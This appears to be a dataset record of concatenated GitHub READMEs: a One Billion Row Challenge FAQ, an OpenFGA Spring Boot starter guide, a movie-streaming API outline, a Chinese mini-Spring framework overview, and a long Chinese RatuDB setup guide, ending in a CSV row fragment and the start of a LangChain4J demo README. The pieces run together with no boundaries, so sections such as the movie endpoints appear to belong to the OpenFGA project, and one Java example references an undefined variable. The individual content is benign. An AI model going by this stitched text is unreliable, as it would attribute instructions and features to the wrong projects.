A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1️⃣🐝🏎️ _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

A Spring Boot Starter for OpenFGA.

## About

[OpenFGA](https://openfga.dev) is an open source Fine-Grained Authorization solution inspired by [Google's Zanzibar paper](https://research.google/pubs/pub48190/). It was created by the FGA team at [Auth0](https://auth0.com) based on [Auth0 Fine-Grained Authorization (FGA)](https://fga.dev), available under [a permissive license (Apache-2)](https://github.com/openfga/rfcs/blob/main/LICENSE) and welcomes community contributions.

OpenFGA is designed to make it easy for application builders to model their permission layer, and to add and integrate fine-grained authorization into their applications. OpenFGA’s design is optimized for reliability and low latency at a high scale.

## Installation

The OpenFGA Spring Boot Starter is available on [Maven Central](https://central.sonatype.com/).

It can be used with the following:

* Gradle (Groovy)

```groovy
implementation 'dev.openfga:openfga-spring-boot-starter:0.0.1'
```

* Gradle (Kotlin)

```kotlin
implementation(""dev.openfga:openfga-spring-boot-starter:0.0.1"")
```

* Apache Maven

```xml
<dependency>
    <groupId>dev.openfga</groupId>
    <artifactId>openfga-spring-boot-starter</artifactId>
    <version>0.0.1</version>
</dependency>
```

## Getting Started

### Requirements

Java 17 and Spring Boot 3

### Configuring the starter

The OpenFGA Spring Boot Starter can be configured via standard [Spring configuration](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config).
The configuration properties are used to create an [OpenFgaClient](https://github.com/openfga/java-sdk/blob/main/src/main/java/dev/openfga/sdk/api/client/OpenFgaClient.java) instance.

#### No Credentials

```yaml
# src/main/resources/application.yaml

openfga:
  api-url: YOUR_FGA_API_URL
  store-id: YOUR_FGA_STORE_ID
  authorization-model-id: YOUR_FGA_AUTHORIZATION_MODEL_ID
```

#### API Token

```yaml
# src/main/resources/application.yaml

openfga:
  api-url: YOUR_FGA_API_URL
  store-id: YOUR_FGA_STORE_ID
  authorization-model-id: YOUR_FGA_AUTHORIZATION_MODEL_ID
  credentials:
    method: API_TOKEN # constant
    config:
      api-token: YOUR_API_TOKEN
```

#### Client Credentials

```yaml
# src/main/resources/application.yaml

openfga:
  api-url: YOUR_FGA_API_URL
  store-id: YOUR_FGA_STORE_ID
  authorization-model-id: YOUR_FGA_AUTHORIZATION_MODEL_ID
  credentials:
    method: CLIENT_CONFIGURATION # constant
    config:
        client-id: YOUR_CLIENT_ID
        client-secret: YOUR_CLIENT_SECRET
        api-token-issuer: YOUR_API_TOKEN_ISSUER
        api-audience: YOUR_API_AUDIENCE
        scopes: YOUR_SPACE_SEPERATED_SCOPES
```

### Using the `fgaClient` bean

Once configured, an `fgaClient` bean is available to be injected into your Spring components:

```java
@Service
public class MyService {
    
    @Autowired
    private OpenFgaClient fgaClient;
}
```

This can be used to interact with the FGA API, for example to write authorization data:

```java
public Document createDoc(String id) {
    // ...
    ClientWriteRequest writeRequest =  new ClientWriteRequest()
            .writes(List.of(new ClientTupleKey()
                    .user(String.format(""user:%s"", SecurityContextHolder.getContext().getAuthentication()))
                    .relation(""owner"")
                    ._object(String.format(""document:%s"", id))));

    try {
        fgaClient.write(writeRequest).get();
    } catch (InterruptedException | ExecutionException | FgaInvalidParameterException e) {
        throw new RuntimeException(""Error writing to FGA"", e);
    }
    // ...
}
```

### Using the `fga` bean

The starter also creates an `fga` bean, which can be used in conjunction with Spring Security's method
security to protect access to resources using FGA:

```java
// Method body will only execute if the FGA check returns true. 403 otherwise.
@PreAuthorize(""@fga.check('document', #docId, 'reader', 'user', authentication?.name)"")
public Document getDocument(@PathVariable String docId) {
    return repository.findById(id);
}
```

You may also omit the user ID, in which case the name of the currently authenticated principal
will be used as the user ID:

```java
// Method body will only execute if the FGA check returns true. 403 otherwise.
@PreAuthorize(""@fga.check('document', #docId, 'reader', 'user')"")
public Document getDocument(@PathVariable String docId) {
    return repository.findById(id);
}
```

## Main Endpoints

### Authentication

- **POST** `/auth/register`: User registration.
- **POST** `/auth/login`: User authentication and JWT generation.

### Movies

- **GET** `/api/v1/movies`: Lists all movies.
- **POST** `/api/v1/movies`: Adds a new movie.
- **GET** `/api/v1/movies/{rid_movie}`: Retrieves details of a specific movie.
- **POST** `/api/v1/ratings`: Adds a review for a movie.

### Streaming

- **GET** `/api/v1/media/hls/{filename}.m3u8`: Streams the video using HLS based on the file name.


### Example of an Authenticated Request with JWT and OAuth2

All routes, except for login and registration, require authentication. The application supports two methods for authenticated requests:

1. **JWT Authentication**: Users can log in with username and password, receiving a JWT token in the response, which is stored as an HTTP-only cookie.
2. **OAuth2 Authentication**: Users can log in via OAuth2 providers (such as GitHub or Google), which returns an authentication cookie upon successful login.

#### JWT Authentication

When logging in with JWT, the server responds with a cookie named `access_token`, containing the JWT token. This cookie will be automatically sent with each request to protected routes.

To access protected routes with JWT authentication, ensure that the `access_token` cookie is included in your request headers. Alternatively, you may manually include the JWT token in the `Authorization` header as shown below.

### Login Request (JWT)

```http
POST /api/login
Content-Type: application/json

{
  ""username"": ""your-username"",
  ""password"": ""your-password""
}
```

### Swagger UI

To see all available endpoints and their descriptions, access Swagger UI:

http://localhost:8080/swagger-ui.html


## Project Structure

- `src/main/java/com/ismael/movies`: Contains the Java classes, including controllers, services, models, and repositories.
- `src/main/resources/templates`: Contains HTML pages rendered by Thymeleaf.
- `src/main/resources/static`: Contains static files like CSS and JavaScript.
- `src/main/resources/application.properties`: Application configuration.

## Security

The application uses **JWT tokens** and **OAuth2** for authentication and authorization. After logging in, the user receives a token or/and a cookie that must be included in the header of all subsequent requests to protected routes.

## ✨ 主要功能

本项目是一个**简易版本的Spring框架**，实现了Spring框架的三大核心功能：**IOC**（控制反转）、**AOP**（面向切面编程）和**MVC**（模型-视图-控制器），并将其分为以下核心包：

#### 📦 Core包

**功能**: Core包实现了框架的**核心功能**，包括**Bean的扫描加载**、**容器的维护**、**单例模式的实现**，以及**自定义Bean的处理**。

**实现方式**: 利用**Java反射机制**动态扫描和加载指定包下的类，识别并处理不同类型的注解（如 `@Component`, `@Controller` 等）以管理不同种类的Bean。同时，它实现了**单例模式**，确保每个Bean只被实例化一次，并提供了操作Bean的基本方法，例如添加、获取和管理Bean实例。

#### 💉 Inject包

**功能**: Inject包负责**依赖注入**，包括处理 `@Autowired` 注解，实现**单例模式下的依赖注入**，以及为**接口注入实现类**。

**实现方式**: 通过**Java反射机制**扫描Bean的字段，查找带有 `@Autowired` 注解的字段，并利用Bean容器获取并注入所需依赖。它支持单例模式下的依赖注入，确保依赖的一致性和唯一性。同时，它也能为接口动态地注入适当的实现类，提高了代码的灵活性和可维护性。

#### 🔍 AOP包

**功能**: AOP包遵循**面向切面编程思想**，使用 `Aspect` 和 `Order` 注解来标识和排序切面类，通过**CGlib动态代理**和**AspectJWeaver**实现横切逻辑的织入，动态修改方法逻辑。

**实现方式**: 利用**CGlib**创建目标类的代理，并通过实现 `MethodInterceptor` 接口来拦截方法调用。这允许在方法执行前后执行切面逻辑（如日志记录、权限检查等）。同时，通过**AspectJ**的表达式语言提供对被代理类更精细的控制，使得可以根据不同的需要对方法逻辑进行修改和增强。

#### 🌐 MVC包

**功能**: MVC包处理**请求分发相关功能**，包括重构 `DispatcherServlet`，实现 `RequestProcessorChain` 和 `RequestProcessor` 矩阵，以及 `ResultRender` 矩阵，完成多种请求的处理与响应渲染。

**实现方式**: 通过 `DispatcherServlet` 作为**中心控制器**，处理所有的HTTP请求并将其分发到相应的处理器。利用 `RequestProcessorChain` 管理和执行一系列请求处理器，以处理不同类型的请求（如静态资源、控制器方法等）。`ResultRender` 矩阵负责根据处理结果选择合适的渲染策略，例如渲染HTML页面或返回JSON数据，确保响应正确地渲染和返回给客户端。

## 💡 快速上手指南

要开始使用 **SimpleFramework**，您可以采取以下步骤：

### 📥 方法一：源码使用

1. 克隆仓库：

   ```bash
   git clone https://github.com/Enndfp/simple-framework.git
   ```

2. 导入项目到您的IDE（例如IntelliJ IDEA）。

3. 在 `demo` 目录下进行相关测试。这与使用Spring Boot开发项目类似。

### 📦 方法二：War包部署

1. 构建项目并生成War包。
2. 将War包部署到您的Servlet容器中，如Apache Tomcat。
3. 启动容器，应用将自动部署。

### 🌟 示例代码

以下是一个简单的示例，展示了如何在您的项目中使用 **SimpleFramework**：

```java
import com.simpleframework.core.BeanContainer;

public class MyApplication {
    public static void main(String[] args) {
        // 初始化容器
        BeanContainer container = BeanContainer.getInstance();
        container.loadBeans(""com.yourpackage"");

        // 使用容器获取Bean
        MyService myService = (MyService) container.getBean(MyService.class);
        myService.doSomething();
    }
}
```

在这个例子中，我们首先获取了 `BeanContainer` 的实例，然后加载了指定包路径下的所有Bean。之后，我们从容器中获取了 `MyService` 类的实例，并调用了其方法。

#### 1、Ratudb简介

RatuDB 是中科睿途基于Cassandra之上研发的新⼀代去中⼼化、分布式分析数据库系统，拥有全⽂索引实时复杂聚合的能⼒，⼜拥有⾼速读取与写⼊的能⼒，即对海量数据存储能⼒⼜具备⾼扩展的效果，还可以⽀持图数据的存储与索引。数据库专为⼤规模数据集设计，能够处理和存储PB级别数据，满⾜⼤数据和⼤模型时代复杂的需求。系统采⽤⼀体化架构设计模式，兼顾分布式架构的扩展性与集中式架构的性能优势，具备⾼扩展、⾼可⽤、稳定可靠等特征。系统⽀持结构化数据库、⾮结构化数据库、索引数据库、图数据库以及向量数据库等存储模式。通过优化 Cassandra 的快速写⼊能⼒和 OpenSearch 的⾼效检索能⼒，实现了⾼性能的数据读写，即使在海量数据处理情况下也能保持优异的性能表现。

##### 1.1、 为什么做

当前市面的数据仓库驳杂繁多，各自拥有自己的风格和特点，同样也存在一些问题。面向大数据场景下的数据分析项目，Hadoop存在学习成本高、管理难度大的情况；Cassandra使用中出现索引的简单化，在精准化查询的需求下，很难满足大数据场景下的查询需求。

为了解决这些问题，中科睿途研发了自己的数仓产品RatuDB，已经在线运行超过一年时间，累计存储数据量超过200亿，日均增量超过4000万条。

RatuDB在大规模数据存储和分析的方向上能够做到线性扩展；能够支持处理高并发和高吞吐量的数据访问；同时具备实时搜索、推荐的能力；在处理大规模数据收集、存储和分析的领域有着独到的优势；

##### 1.2、 RatuDB架构及能力

RatuDB采用无主架构，最终一致性的原则，具有良好的可扩展性，可以方便地添加新的节点和扩展集群规模，其构成分为持久化组件，索引组件，和图数据组件三个部分；

如图：

![img](img/1.jpg)

从逻辑结构上来讲，RatuDB只有三层实现，应用层、数据库模型和存储层， 存储应用了两种存储形式，只有文件系统存储和lucene。而文件系统数据，就存储了Wide Column数据库模型的大量数据，lucene作为索引更好的将两种数据结合使用。

如图：

![img](img/2.png)



以下分别介绍持久化，索引，图数据组件：

###### **持久化组件**

RatuDB的读写操作是通过分布式架构和一致性哈希算法实现的。在写入操作中，数据首先被写入到内存中的MemTable，当MemTable的大小达到一定阈值时，数据会被刷新到磁盘上的SSTable文件中。读取操作则会从MemTable和SSTable中合并数据，以提供给用户。

RatuDB拥有多种一致性级别，允许开发者在数据一致性和可用性之间做出权衡。一致性级别定义了在读写操作中要求多少个节点响应才被认为是成功。较低的一致性级别可以提高性能，但会牺牲一些数据的一致性。较高的一致性级别可以提高数据的一致性，但可能会影响性能。

RatuDB的分布式特性主要体现在数据分片和复制上。数据分片通过一致性哈希算法实现，将数据分散存储在多个节点上，实现水平扩展。复制则通过多副本备份策略，将数据复制到多个节点上，当某个节点发生故障时，其他节点可以接管其工作，保证系统继续运行。RatuDB的分布式架构支持动态扩展和自动负载均衡，使得它能够适应不断变化的数据和流量需求。

RatuDB采用Cassandra作为自己的数据持久化组件；Cassandra 是一种高性能分布式NoSQL数据库，可以管理分布在许多服务器上的大量数据，同时保持高可用性。拥有提供出色的容错性，读写性能卓越，高扩展，简单易用的特点。

然而Cassandra在实际生产使用中，对数据模型设计有着一定的要求，对复杂查询与范围检索支持能力较差，在精准化查询的需求中很难满足，如果进行庞大的分析查询功能将无法满足。

对此情形RatuDB引入了索引机制强化在分析查询领域的能力。

###### **搜索引擎的引入**

RatuDB在实时检索和报表聚合领域能力依然强悍。RatuDB选择OpenSearch作为索引数据库；Opensearch是一个开源的搜索和分析套件。RatuDB就拥有了强大的查询能力，支持复杂的查询语句和聚合操作、支持多种数据处理功能，包括实时数据导入、格式转换、数据解析和索引构建等能力。还提供了数据湖支持，使得用户可以更方便地处理和分析大量的非结构化数据。

Cassandra作为宽表存储，写入性能强悍，但在复杂查询与数据聚合等方面却稍显不足；RatuDB采用把索引存入OpenSearch，可结合各自特点，提高查询效率。复制到OpenSearch中的索引也起到备份作用，且可以充分利用OpenSearch的聚合分析能力，进行数据分析操作。

引入二级索引改进配置和工程化。Cassandra使用二级索引，在原生开源环境下，需要大量配置工作，在运维过程中需要相当专业的经验和知识储备。 RatuDB针对这一问题，将配置服务进行整合，以尽可能少的配置驱动运行服务，且不会影响原生系统的性能和扩展能力。当RatuDB二级索引建立后，会同步给OpenSearch中创建索引，并同步数据。在查询时，可以向OpenSearch发起查询，而OpenSearch作为二级的索引，可以准实时将索引结果反馈给用户。



![img](img/3.jpg)

针对Opensearch的同步或者异步的写入和查询，无法匹配Cassandra的写入性能，并且在应用过程当中存在机器资源内存占用十分恐怖的现象，这使得机器成本大大增加。在数据持续写入成了一个很困难的问题，持续的异步写入，会多次让Opensearch服务崩溃掉(JVM堆溢出)，但是同步的写入也会持续相当长的时间。这些问题与现象是无法接受的。

Ratudb针对Opensearch的写入性能与内存不合理占用的情况，做了大量的优化，使得数据写入存储性能提升，从而搭配Cassandra的特点，让系统能够支持高效写入的状态同时保持优秀的复杂查询能力。又针对Opensearch内存不合理占用的情况，优化内存分配合理使用，降低机器使用资源。



###### **RatuDB对图数据的支持**

RatuDB的图数据库是在JanusGraph基础上做的优化。JanusGraph是一个图形数据库引擎，其本身专注于图形序列化，图形建模、查询执行等基本功能，支持多节点分布式图实时遍历和分析查询。 RatuDB图数据库组件，后台数据存储选择的是Cassandra，索引是采用OpenSearch。

JanusGraph本身的配置与环境搭建较为繁杂，RatuBD中对此作了大量的简化使得应用的使用门槛进一步降低，在应用中只需一个服务的运行便可以使用图数据库的全部能力。让一个应用即可满足索引与存储的一体化的效果。为运维与基层使用承成员减少大量配置维护成本。

##### 1.3、 RatuDB的优势与特点

RatuDB拥有以下特点：

· 无中心分布式架构；RatuDB采用无中心的分布式架构理念；可以通过分布式架构和数据复制来实现⾼可⽤性，因此更加抗攻击。数据就近存储和处理在⽆中⼼数据库系统中，降低了数据传输的延迟，提⾼系统的响应速度。根据系统的负载和变化来⾃动调整数据的分布和处理⽅式，以适应不同的⼯作负载和需求。可以很容易地向系统中添加新的节点，以实现系统的扩展和提⾼性能。

· 支持多数据库模型；从设计之初，RatuDB思考的就是如果能够增加自己本身支持的数据库模型，不是单纯的在一种存储形式上去增加其他数据库模型的视线，而是在真正的Wide Column这种数据库模型的基础上，去提升它本身从硬盘上提取数据IO弊端。而Search Engines模型的结合进而补充了这一点。然后在这基础上增加了Graph和Vector两种数据库模型。

· 向量检索；RatuDB在向量检索场景，支持毫秒级查询和秒级更新，适用于不同企业和业务的问答场景向量结果返回；向量检索与大模型结合，可以将企业数据和对话交互信息进行向量特征提取，然后存入向量检索引擎构建索引并进行相似度召回。

· 高性能的搜索分析；依托于Opensearch和Apache Lucene的底层技术实现，可以很容易的在RatuDB内部实现提取、保护、搜索、聚合、查看以以及分析数据。

· 分布式线性扩展； 一个有效的RatuDB集群，在扩展的时候，会在整体集群环形节点上新增一个节点。

· 高性能；可以提供出色的查询性能和处理能力，能够在短时间内处理大量数据。

· 强大的分析能力；提供丰富的分析功能，包括数据可视化、预测分析等。

· 一站式数据仓建设：从数仓建设体系来看，选择RatuDB的学习和使用成本最低，CQL作为类似SQL的存在形式，及易上手。只需要熟悉常用的DSL语法即可。并且RatuDB本身对硬件的要求不是很高，在实际的开发测试过程中，千万级别的数据，使用普通的服务器进行写入存储和查询即可实现。随着业务量增加，不断向集群增加服务器节点即可。

· 为AI赋能： Vector数据库模型的支持，为图像检索、音频检索、文本检索等领域提供了高效的存储和检索大规模的向量数据，以满足AI在向量数据各种场景下的业务需要。

在选择数据仓库技术时，需要综合考虑多个关键因素，以确保选型能够满足业务需求并提供高效、可靠的数据支持。



##### 1.4、 性能比对

![img](img/5.png)



测试结果显示，RatuDB的读写能力与查询响应能力和同类数据库相比，性能优势明显。

##### 1.5、 总结

## 2、Getting Started

#### 2.1、Requirements

- JDK 11
- Python 3.8 ~ 3.11 (CQL客户端需要)

#### 2.2 Installation

- [下载] 并且 解压 RatuDB 安装包.
- 运行 `bin/ratudb_server` 在 Linux 或者 macOS.
- 运行 `curl -X GET http://localhost:9200/` 验证 Opensearch 是否运行.
- 运行 `./bin/ratudb_client`，默认不填写`ip`地址的情况下，就是连接`127.0.0.1`，可以验证Cassandra是否运行。
- 也可以使用`./bin/nodetool` 客户端工具，查看集群变化，RatuDB默认开放 7199 端口，用于查看集群状态。
- 运行 `./bin/ratudb_client --graph` 就是连接到Janusgraph。

#### 2.3、构建源码

RatuDB 使用 [Gradle](https://gradle.org/) 构建系统.

Gradle 使用 `8.4` 版本，不建议升级 Gradle版本。

同时也需要安装 ant 1.10 。

完成的发行版将输出到 `distributions/archives` 目录.

##### 2.3.1、Fork并且克隆代码

拉取源代码，这样只是将RatuDB的代码拉取下来了，没有子项目Cassandra的代码。

```
git clone https://github.com/Ratu-Tech/RatuDB.git
```

项目里，Cassandra的源码作为项目的 `submodule` 所以拉取的时候需要递归拉取，可以执行下边的命令拉取代码：

```
git clone https://github.com/Ratu-Tech/RatuDB.git --recursive
```

第一次拉取完成之后，cassandra 的源码作为子模块，也需要初始化，安装好ant 1.10以上版本 之后，可以进入源码 **server/cassandra** 目录，然后执行：

```
ant mvn-instal
```

这样就会对所有的cassandra 需要的jar包进行初始化。 当然JDK11要提前安装好。

之后，就可以执行一下运行：

```
./gradlew run
```

如果配置了JDK11, 就可以运行RatuDB，就会拉取一下相关依赖的包，当然也可以直接在IDEA里边打开做同步。

##### 2.3.2、JDK

本机开发的时候，需要配置两个JDK，

```
export RUNTIME_JAVA_HOME=""JDK14路径""
export JAVA_HOME=""JDK11路径""
```

RUNTIME_JAVA_HOME 是ES 的运行时JDK。

##### 2.3.3、构建

本身项目里，是导入了Cassandra的所有ant任务，而RatuDB启动后自动加载，Cassandra的api包。

所以在架构项目之前，建议先执行，Cassandra的api包的构建任务，当然，如果没有修改Cassandra，也可以直接使用，源码自带了一个成品包。

构建Cassandra的API的jar包：

```
./gradlew cassandra-mvn-install
```

这样就更新了Cassandra 的api包。

构建全平台包：

```
./gradlew assemble
```

这个命令不推荐使用，原因有两点：第一，需要连接Docker，如果Docker服务没启动，构建任务会产生失败。 再有就是很慢，所以还是构建需要的平台版本，比较好，可以执行如下命令：

###### 2.3.3.1、构建linux版本

```
./gradlew :distribution:archives:linux-tar:assemble
```

###### 2.3.3.2、构建mac版本

```
./gradlew :distribution:archives:darwin-tar:assemble
```

###### 2.3.3.3、构建windows版本

```
./gradlew :distribution:archives:windows-zip:assemble
```

这是指定了平台版本，如果想构建本机系统版本，还有一个命令，也可以使用：

```
./gradlew localDistro
```

#### 3、导入项目到 IntelliJ IDEA

RatuDB 使用JDK11,全局配置JDK11就可以了。

- 选择 **File > Open**
- 在随后的对话框中导航到根目录 `build.gradle` 文件
- 在随后的对话框中选择 **Open as Project**

#### 4、高级索引的使用

##### 4.1、创建表

首先，两个服务启动成功后，登录Cassandra：

```
$ ./bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042
[cqlsh 6.1.0 | Cassandra 4.1.3-SNAPSHOT | CQL spec 3.4.6 | Native protocol v5]
Use HELP for help.
cqlsh>
```

然后可以创建一个keyspaces:

```
CREATE KEYSPACE lei
WITH REPLICATION = {'class': 'SimpleStrategy', 'replication_factor': 1};
```

然后再创建一张表:

```
CREATE TABLE lei.tweets (
   id INT PRIMARY KEY,
   user TEXT,
   body TEXT,
   time TIMESTAMP,
   latitude FLOAT,
   longitude FLOAT
);
```

##### 4.2、创建索引

接下来的创建的索引，举例如下：

```
CREATE CUSTOM INDEX tweets_index ON lei.tweets ()
USING 'org.apache.ratu.second.ElasticSecondaryIndex'
WITH OPTIONS = {
   'refresh_seconds': '1',
   'async_write': 'true',
   'schema': '{
      fields: {
         id: {type: ""integer""},
         user: {type: ""text""},
         body: {type: ""text"", analyzer: ""english""},
         time: {type: ""date"", pattern: ""yyyy-MM-dd""},
         latitude: {type: ""float""},
         longitude: {type:""float""}
      }
   }'
};
```

这是一个全字段索引的例子，当然也可以根据自己的需要进行索引配置。

接下来拆解这些内容：

`CREATE CUSTOM INDEX tweets_index ON lei.tweets ()` 这句的意思就是创建一个自定义索引，名字叫 `tweets_index` 在 `lei.tweets` 这张表上。

`USING 'org.apache.ratu.second.ElasticSecondaryIndex'` 这句就是引用了二级索引的操作类。

`WITH OPTIONS` 就是二级索引的参数。参数里 `refresh_seconds` 就是 Opensearch 的索引刷新频率，如果数据写入频繁，这个值不建议设置过大，索引数据写入ES之后，还是要刷新，才会在ES中查询到，这个刷新频率就是靠这个参数控制的。数据写入频繁，刷新过快，会导致ES内存占用过大，导致内存溢出。默认值是`-1`。 如果未设置的情况，如果在Opensearch中可见，需要手动刷新，执行如下api：

```
POST 索引名/_refresh
```

`schema` 里的 `fields` 就是配置写入 Opensearch 的字段，举个例子：

`body: {type: ""text"", analyzer: ""english""},` 这里边 `type` 就是类型，`analyzer` 就是分词器。

`time: {type: ""date"", pattern: ""yyyy-MM-dd""},` 这里边的 `pattern` 就是日期格式。

并且，如果设置 `text` 也会对应创建子字段。

以上都执行完成后，可以执行在Opensearch里看到索引已经创建了：

##### 4.3、写入数据

再写入几条数据试试,

```
INSERT INTO lei.tweets (id, user, body, time,latitude,longitude) VALUES (1, 'fu', 'abc', '2015-05-15',41.12,-71.34);

INSERT INTO lei.tweets (id, user, body, time,latitude,longitude) VALUES (2, 'fu', '123456', '2019-05-15',41.12,-71.34);

INSERT INTO lei.tweets (id, user, body, time,latitude,longitude) VALUES (3, 'lei', '123456', '2019-05-15',41.12,-71.34);
```

##### 4.4、查询

既然写入索引变化了，所以在Cassandra中查询数据，也需要一个新的表达式，才能进行二级索引的使用：

```
<!--range查询-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""range"", field: ""time"", gte: ""2014-04-25"", lte: ""2015-05-21""}
}');
query:代表的就是普通查询
type:代表的就是DSL的查询函数
field: 代表的是要查询的字段
gte:  大于等于
lte:  小于等于
<!--match查询-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""match"", field: ""user"", query: ""lei""}
}');
<!--match查询, value形式-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""match"", field: ""user"", value: ""lei""}
}');
<!--match_phrase查询-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""match_phrase"", field: ""user"", query: ""lei""}
}');
<!--match_phrase查询, value形式-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""match_phrase"", field: ""user"", value: ""lei""}
}');
<!--term查询 -->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""term"", field: ""user"", value: ""lei""}
}');
```

这个查询与其他的查询的区别是多了 `refresh: true` ，这是将索引写入ES 之后，对ES里的数据进行强制刷新。如果数据写入频率不高，可以使用，频率过快，还多。不建议使用。

```
<!--强制刷新后，range查询-->
SELECT * FROM lei.tweets WHERE expr(tweets_index, '{
   query: {type: ""range"", field: ""time"", gte: ""2014-04-25"", lte: ""2015-05-21""},
   refresh: true
}') limit 100;
```

##### 4.5、 Cassandra 与 Opensearch 数据类型对应关系

在创建索引的时候，可以参考这张表

#### 5、janusgraph 配置

##### 修改配置文件。

**janusgraph-cql-opensearch.properties**

这是新建图时候服务存储的核心配置文件了，这里边有几个配置重点讲一下。

------

storage.hostname=127.0.0.1 --- 这是存储的配置，默认启动是127.0.0.1。如果集群模式下，可以把集群内所有IP的地址填写上即可，用逗号分隔开，举例：storage.hostname=192.168.184.31，192.168.184.32，192.168.184.33

------

storage.cql.keyspace=ratudb --- 这是图数据存储到Cassandra里边之后的keyspace名字，现在默认是ratudb，可以根据情况调整。

------

storage.cql.local-datacenter=datacenter1 --- 这是数据中心名称配置，这个在不复杂的网络环境里，建议和cassandra一致即可。默认datacenter1也是cassandra的默认配置。

重点讲一下索引到opensearch的三个配置：

```
index.[X].backend=opensearch
index.[X].hostname=127.0.0.1
index.[X].index-name=sanguosha
```

三个配置，第一个是索引指向opensearch，默认值即可。第二个索引存储的地址，如果集群模式下，可以把集群内所有IP的地址填写上即可，用逗号分隔开，举例：index.[X].hostname=192.168.184.31，192.168.184.32，192.168.184.33。第三个是索引别名，就是配置索引存储的索引名字。

重点说这个X，X位置默认是search，这时候，创建的索引名前缀是janusgraph。如果想修改掉，需要讲X修改为指定名字。并且三项要在同时的配置时候一致。再强调一遍，X位置的配置一定要一致。

#### 6、客户端使用

ratudb_client 是RatuDB的客户端工具。

##### 6.1、连接janusgraph，执行下面命令：

```
./bin/ratudb_client --graph
```

##### 6.2、连接Cassandra，执行下面命令：

```
./bin/ratudb_client 192.168.184.33
```

##### 6.3、新建图

```
graph = JanusGraphFactory.open('../config/janusgraph-cql-opensearch.properties');
```

janusgraph-cql-opensearch.properties 图的配置，配置信息如上面。一定注意路径，必须是*../config/janusgraph-cql-opensearch.properties*。

## 7、集群配置

**举例：**

##### 7.1、我准备了三个linux的虚拟机，分别为

```
192.168.184.31
192.168.184.32
192.168.184.33
```

**JDK 只需要配置11 就可以了，linux环境不建议使用内置jdk，内置jdk使用的是 adoptopenjdk ，内置的是15的版本，但是Cassandra大量使用了反射，而这款jdk在测试过程中反射问题不少。所以linux环境不建议使用。**

环境变量需要配置在`/etc/profile`里边，如下内容：

```
export JAVA_HOME=/home/elastic/jdk-11
export PATH=$JAVA_HOME/bin:$PATH
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
```

##### 7.2、先打包liunx版本的发行包

执行：

```
./gradlew :distribution:archives:linux-tar:assemble
```

##### 7.3、将RatuDB的压缩包上传到三台机器里并解压

##### 7.4、接下来修改配置

RatuDB 现在只需要修改 `config` 目录下的 `cassandra.yaml`

需要配置的内容：

```
cluster_name: 'Ratu Cluster'
```

集群名字，这项配置，需要集群内所有机器都是相同的才可以。但是Cassandra有个特点，如果想要修改这个集群名字，需要在Cassandra基础元数据表里先进行修改，然后再修改配置。具体可以参考网上给的配置。所以最终结论就是，当配置好后，正常启动服务了，就不要修改这项值。

```
rpc_address: 192.168.184.31
```

通信地址，这个值配置上之后，es服务的`network.host` 也使用的是这个值。

```
listen_address: 192.168.184.31
```

监听地址。

```
- seeds: ""192.168.184.31:7000,192.168.184.32:7000,192.168.184.33:7000""
```

集群节点配置。ES的 `discovery.seed_hosts` 和 `cluster.initial_master_nodes` 也使用这个配置，但是 `http.port` 和 `transport.port` 就没有灵活配置了，就是默认的 `9200` 和 `9300` 。

##### 7.5、数据中心和机架配置

还有一个配置在 `cassandra-rackdc.properties` 文件，这里边就配置了两个值：

```
dc=dc1
rack=rack1
```

`dc` 代表数据中心，`rack` 代表的是机架。 这两个值，对应Opensearch就是自定义属性，配置好就是这个样子：

这个值，预设过来，可以做冷热集群使用。

##### 7.6、修改数据存储目录

在cassandra.yaml文件内，通过更改`data_file_directories` 可以更改cassandra和es的存储路径，如果没有配置的情况下，默认存储在当前程序目录下的`data`目录下。

##### 7.7、启动集群

分别在三个节点启动服务,执行`./bin/ratudb_server`,如果想要用守护进程启动，可以加`-d`参数",1,0,7,apache-2.0,2.0
jdubois/jdubois-langchain4j-demo,main,"# LangChain4J demo

_Author: [Julien Dubois](https://www.julien-dubois.com)_

## Goal

This is a Spring Boot project that demonstrates how to use LangChain4J to create Java applications using LLMs.

It contains the following demos:

- How to generate an image using Dalle-3.
- How to generate a text using GPT-4o, GPT-4o-mini, Phi-3.5 and tinyllama.
- How to use a chat conversation with memory of the context.
- How to ingest data into a vector database, and use it.
- How LangChain4J's ""Easy RAG"" works, and a complete example using it.

Those demos either run locally (with Docker, using Ollama and Qdrant) or in the cloud (using Azure OpenAI or GitHub Models, and Azure AI Search).

## Slides

2 slide decks are available to detail this demo:

- [An introduction to LangChain4J](LangChain4J%20intro.pdf): a quick overview of LangChain4J
